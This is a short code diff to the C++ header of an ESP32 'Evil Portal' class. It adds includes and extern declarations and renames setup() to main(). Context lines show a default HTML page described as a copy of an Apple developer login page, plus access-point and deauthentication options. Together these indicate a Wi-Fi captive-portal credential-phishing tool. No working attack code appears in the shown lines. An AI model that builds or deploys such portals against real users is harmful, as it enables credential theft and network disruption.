@@ -18,7 +18,16 @@
 
 #include <LinkedList.h>
 
+#include "core/sdcardmountheader.h"
+#include "core/settingheader.h"
 #include "wifiheader.h"
+#include "core/utilsheader.h"
+
+extern ESP32ATSetting espatsettings;
+extern String htmlFile;
+
+extern SDCardModules sdcard;
+
 
 const char default_html[] PROGMEM = R"=====(
     <!-- Original code : https://github.com/ai-dev-official/Apple-Dev-Login-Page- by ai-dev-official -->
@@ -349,7 +358,7 @@ class EvilPortalAddtional
         void apStart();
         bool apSetup(String essid, bool _deauth);
         bool htmlSetup();
-        void setup();
+        void main();
         void loop();
 };
 
